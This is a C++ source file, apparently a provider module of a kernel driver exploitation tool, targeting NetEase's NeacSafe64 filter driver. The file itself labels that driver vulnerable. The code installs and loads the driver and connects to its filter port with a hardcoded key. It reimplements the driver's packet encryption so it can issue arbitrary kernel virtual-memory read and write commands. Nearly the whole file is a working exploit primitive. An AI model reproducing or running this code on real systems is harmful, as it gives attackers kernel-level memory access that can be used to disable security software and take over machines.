/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025
*
*  TITLE:       NETEASE.CPP
*
*  VERSION:     1.44
*
*  DATE:        10 Jul 2025
*
*  NetEase drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/netease.h"

//
// Based on https://github.com/smallzhong/NeacController
// 

BYTE g_Key[33] = "FuckKeenFuckKeenFuckKeenFuckKeen";
unsigned char g_NetEaseSafe_EncImm[] =
{
    0x7A, 0x54, 0xE5, 0x41, 0x8B, 0xDB, 0xB0, 0x55, 0x7A, 0xBD,
    0x01, 0xBD, 0x1A, 0x7F, 0x9E, 0x17
};

SUP_SETUP_DRVPKG g_NetEasePackage;

#define NEACSAFE64INF_FILE TEXT("NeacSafe64.inf")

// as is, copied from NeacSafe64 driver.
void NetEaseEncyptBuffer(unsigned int* buffer, unsigned int idx)
{
    __m128i v2;
    unsigned int* result; 
    int v4; 
    __m128i v5;
    __m128i v8;

    __m128i imm = _mm_load_si128((__m128i*)g_NetEaseSafe_EncImm);
    __m128i zero;
    memset(&zero, 0, sizeof(__m128i));
    v2 = _mm_cvtsi32_si128(idx);
    result = &v8.m128i_u32[3];
    v8 = _mm_xor_si128(
        _mm_shuffle_epi32(_mm_shufflelo_epi16(_mm_unpacklo_epi8(v2, v2), 0), 0),
        imm);
    v4 = 0;
    v5 = _mm_cvtsi32_si128(0x4070E1Fu);
    do
    {
        __m128i v6 = _mm_shufflelo_epi16(_mm_unpacklo_epi8(_mm_or_si128(_mm_cvtsi32_si128(*result), v5), zero), 27);
        v6 = _mm_packus_epi16(v6, v6);
        *buffer = (*buffer ^ ~idx) ^ v6.m128i_u32[0] ^ idx;
        ++buffer;
        result = (unsigned int*)((char*)result - 1);
        v4++;
    } while (v4 < 4);
    return;
}

void NetEaseSafeEncodePayload(PBYTE key, PBYTE buffer, SIZE_T size) 
{
    for (int i = 0; i < size; i++) {
        buffer[i] ^= key[i & 31];
    }
    unsigned int* ptr = (unsigned int*)buffer;
    unsigned int v12 = 0;
    do
    {
        NetEaseEncyptBuffer(ptr, v12++);
        ptr += 4;
    } while (v12 < size >> 4);
}

HANDLE NetEaseConnectDriver(
    _In_ KDU_CONTEXT* Context
) 
{
    HANDLE hPort;
    HRESULT hResult;
    NEAC_FILTER_CONNECT lpContext;
    WCHAR szPortName[MAX_PATH + 1];

    lpContext.Magic = 0x4655434B;
    lpContext.Version = 8;

    RtlCopyMemory(lpContext.EncKey, g_Key, 32);

    StringCchPrintf(szPortName, RTL_NUMBER_OF(szPortName), 
        TEXT("\\%ws"),
        Context->Provider->LoadData->DeviceName);
    
    hResult = FilterConnectCommunicationPort(szPortName,
        FLT_PORT_FLAG_SYNC_HANDLE,
        &lpContext,
        40,
        NULL,
        &hPort
    );
    if (hResult != S_OK || hPort == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    return hPort;
}

/*
* NetEaseStartVulnerableDriver
*
* Purpose:
*
* Start vulnerable driver callback.
* Install NetEase fs filter driver.
* 
*/
BOOL NetEaseStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL          bLoaded = FALSE;
    PKDU_DB_ENTRY provLoadData = Context->Provider->LoadData;
    LPWSTR        lpPortName = provLoadData->PortName;

    RtlSecureZeroMemory(&g_NetEasePackage, sizeof(SUP_SETUP_DRVPKG));

    g_NetEasePackage.InfFile = NEACSAFE64INF_FILE;
    g_NetEasePackage.InfFileResourceId = IDR_DATA_NEACSAFEINF;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\", lpPortName)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        if (supSetupManageFsFilterDriverPackage(Context, TRUE, &g_NetEasePackage)) {

            WCHAR szBuffer[MAX_PATH + 1];
            UNICODE_STRING driverServiceName;

            //
            // Load as usual.
            //
            if (SUCCEEDED(StringCchPrintf(szBuffer, MAX_PATH,
                DRIVER_REGKEY,
                NT_REG_PREP,
                provLoadData->DriverName)))
            {

                RtlInitUnicodeString(&driverServiceName, szBuffer);
                NTSTATUS status = NtLoadDriver(&driverServiceName);
                bLoaded = NT_SUCCESS(status);
                if (!bLoaded) {
                    supShowHardError("[!] Unable to load vulnerable driver", status);
                }
            }

        }
    }

    //
    // If driver loaded then open handle for it port.
    // This is simplified version of KDUProvOpenVulnerableDriverAndRunCallbacks as the target does need all this functionality.
    //
    if (bLoaded) {
        HANDLE portHandle = NetEaseConnectDriver(Context);
        if (portHandle == NULL) {
            supShowWin32Error("[!] Unable to open vulnerable driver port handle", GetLastError());
        }
        else {
            supPrintfEvent(kduEventInformation,
                "[+] Driver port \"%ws\" has been opened successfully\r\n",
                Context->Provider->LoadData->PortName);
            Context->PortHandle = portHandle;
        }

    }
    else {
        supShowWin32Error("[!] Vulnerable driver is not loaded", GetLastError());
    }

    return (Context->PortHandle != NULL);
}

/*
* NetEaseStopVulnerableDriver
*
* Purpose:
*
* Stop vulnerable driver callback.
* Uninstall NetEase driver and remove files.
*
*/
VOID NetEaseStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    PKDU_DB_ENTRY provLoadData = Context->Provider->LoadData;
    WCHAR szBuffer[MAX_PATH + 1];
    UNICODE_STRING driverServiceName;

    //
    // Load as usual.
    //
    if (SUCCEEDED(StringCchPrintf(szBuffer, MAX_PATH,
        DRIVER_REGKEY,
        NT_REG_PREP,
        provLoadData->DriverName)))
    {

        RtlInitUnicodeString(&driverServiceName, szBuffer);
        NTSTATUS status = NtUnloadDriver(&driverServiceName);
        if (!NT_SUCCESS(status)) {
            supShowHardError("[!] Unable to unload vulnerable driver", status);
        }
        else {
            printf_s("[+] Vulnerable driver unloaded\r\n");
        }

        supSetupManageFsFilterDriverPackage(Context, FALSE, &g_NetEasePackage);
    }
}

/*
* NetEaseReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via NetEase driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI NetEaseReadVirtualMemory(
    _In_ HANDLE PortHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    DWORD bytesReturned;
    BYTE packetBuffer[16];
    NEAC_READ_PACKET* ptr = (NEAC_READ_PACKET*)packetBuffer;

    ptr->Opcode = OpCode_ReadVM;
    ptr->Src = (PVOID)VirtualAddress;
    ptr->Size = NumberOfBytes;

    NetEaseSafeEncodePayload(g_Key, packetBuffer, sizeof(packetBuffer));
    return SUCCEEDED(FilterSendMessage(PortHandle, packetBuffer, sizeof(packetBuffer), Buffer, NumberOfBytes, &bytesReturned));
}

/*
* NetEaseWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via NetEase driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI NetEaseWriteVirtualMemory(
    _In_ HANDLE PortHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    DWORD bytesReturned;
    BYTE buffer[32];
    NEAC_WRITE_PACKET* ptr = (NEAC_WRITE_PACKET*)buffer;

    ptr->Opcode = OpCode_WriteVM;
    ptr->Dst = (PVOID)VirtualAddress;
    ptr->Src = Buffer;
    ptr->Size = NumberOfBytes;
    
    NetEaseSafeEncodePayload(g_Key, buffer, sizeof(buffer));
    return SUCCEEDED(FilterSendMessage(PortHandle, buffer, sizeof(buffer), NULL, NULL, &bytesReturned));
}
